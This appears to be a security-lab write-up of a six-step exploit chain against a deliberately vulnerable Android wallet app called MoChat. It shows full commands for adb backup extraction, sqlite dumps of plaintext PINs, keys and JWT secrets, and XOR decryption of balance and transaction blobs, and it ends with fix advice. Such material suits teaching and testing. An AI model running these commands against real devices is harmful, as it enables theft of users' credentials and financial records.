# Chain 08 — Backup Extraction + Native Crypto Reverse

## Overview

| Field | Value |
|-------|-------|
| **Category** | storage + native |
| **Difficulty** | HARD |
| **Steps** | 6 |
| **Components crossed** | wallet.db + libmochat.so |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | adb backup → db harvest → pref harvest → native crypto flaw → bulk decrypt |

## Vulnerable surface

- `AndroidManifest.xml` — `android:allowBackup="true"` on the application tag
- `wallet.db` `keys` table — `MASTER_PIN` and `WALLET_KEY` stored plaintext
- `mochat_prefs.xml` — JWT and mini-app AppSecrets in cleartext preferences
- `libmochat.so` `walletDecrypt(data, key)` — loop bug reduces the cipher to single-byte XOR
  with `key[keyLen-1]`
- `balance_enc` BLOB column — encrypted with the broken native routine

## Step-by-step exploit

### ① adb backup com.mochat.app (allowBackup=true)

```bash
# allowBackup=true lets adb produce a full backup without root.
adb backup -f mochat.ab -noapk com.mochat.app
# On the device: confirm "Full backup" prompt (or use a backup-allowing build).
# Decompress the .ab:
dd if=mochat.ab bs=1 skip=24 | python -c "import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" > mochat.tar
tar -xf mochat.tar
```

### ② Extract wallet.db, read keys table → MASTER_PIN + WALLET_KEY plaintext

```bash
sqlite3 apps/com.mochat.app/db/wallet.db "SELECT k, v FROM keys;"
# MASTER_PIN = 137846
# WALLET_KEY = MoChat!
```

### ③ Extract mochat_prefs.xml → JWT + mini-app AppSecrets

```bash
cat apps/com.mochat.app/sp/mochat_prefs.xml
# <string name="jwt">eyJhbGciOiJIUzI1NiJ9....</string>
# <string name="mall_app_secret">8f2a...</string>
# <string name="mall_app_id">wx7a9...</string>
```

### ④ Reverse libmochat.so: walletDecrypt reduces to single-byte XOR with key[last]

In the disassembly, the inner loop is:

```c
for (i = 0; i < len; i++)
    for (j = 0; j < keyLen; j++)
        out[i] = data[i] ^ key[j];   // overwrites out[i] each iteration
```

Net effect: `out[i] = data[i] ^ key[keyLen-1]`. For `WALLET_KEY = "MoChat!"`,
`key[last] = '!' = 0x21`.

```
plaintext[i] = ciphertext[i] ^ 0x21
```

### ⑤ Decrypt all balance_enc BLOBs offline

```bash
# Dump every balance_enc blob to a flat file, then XOR with 0x21.
sqlite3 apps/com.mochat.app/db/wallet.db \
  "SELECT hex(balance_enc) FROM accounts;" > blobs.txt

python - <<'PY'
with open('blobs.txt') as f:
    for line in f:
        b = bytes.fromhex(line.strip())
        pt = bytes(x ^ 0x21 for x in b).rstrip(b'\x00')
        print("balance(fen):", pt.decode())
PY
# balance(fen): 8123400
# balance(fen): 150000
# ...
```

### ⑥ Recover full balance + all transaction history

```bash
# Same XOR routine applies to the transaction history BLOBs (tx_enc column).
sqlite3 apps/com.mochat.app/db/wallet.db \
  "SELECT hex(tx_enc) FROM transactions;" | \
  python -c "import sys; [print(bytes(x^0x21 for x in bytes.fromhex(l.strip())).decode(errors='ignore')) for l in sys.stdin]"
# -> full ledger: counterparties, amounts, timestamps
```

**logcat (if app is running while you cross-check)**:

```
WalletRepo: total_balance=8273400 tx_count=142
```

Matches the offline-decrypted totals.

## Guard analysis

| Guard | Status |
|-------|--------|
| android:allowBackup | true (full backup reachable via adb) |
| wallet.db encryption-at-rest | absent (plaintext keys table) |
| mochat_prefs secret storage | absent (JWT/secrets in cleartext) |
| libmochat.so crypto implementation | broken (XOR loop reduces to single-byte key) |
| WALLET_KEY entropy | low (ASCII string) |
| Server-side balance reconciliation | absent (client values trusted) |

## Impact

Full offline compromise of the wallet and all transaction history using only `adb backup` and
a static-analysis reverse of the native library — no exploit, no root, no on-device trojan
required. Attacker recovers every balance, every transaction, the JWT, mini-app AppSecrets,
the MASTER_PIN, and the WALLET_KEY, enabling downstream forgery (see chains 01, 06) and direct
balance tampering.

## Fix

- Set `android:allowBackup="false"` (or use `android:dataExtractionRules` to deny full backup
  of databases and preferences).
- Never store credentials or keys plaintext. Use the Android Keystore for keys; store derived
  hashes for PINs.
- Fix `walletDecrypt`: use a vetted AEAD (AES-GCM) via `libcrypto`/BoringSSL, not a hand-rolled
  XOR loop. Add KAT (Known Answer Test) unit tests.
- Do not reuse the DB-stored WALLET_KEY as an encryption key; derive per-record keys with
  HKDF and a nonce.
- Persist secrets in EncryptedSharedPreferences (Jetpack Security) rather than raw XML.
